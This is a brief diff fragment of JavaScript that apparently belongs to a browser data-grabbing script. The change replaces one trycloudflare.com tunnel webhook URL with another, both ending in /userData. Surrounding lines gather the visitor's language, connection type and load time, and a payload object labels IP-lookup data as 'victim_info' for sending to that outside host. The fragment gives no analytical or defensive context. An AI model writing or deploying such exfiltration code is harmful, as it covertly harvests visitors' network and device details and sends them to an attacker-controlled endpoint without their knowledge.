@@ -84,7 +84,7 @@ Language: ${userLanguage}
 Connection Type: ${connectionType}
 Loading Time: ${loadTime}`;
 
-                const webhookURL = "https://he-antonio-paragraph-allergy.trycloudflare.com/userData";
+                const webhookURL = "https://exception-polyphonic-appointed-md.trycloudflare.com/userData";
 
                 const payload = {
                     'victim_info': ipinfo, 
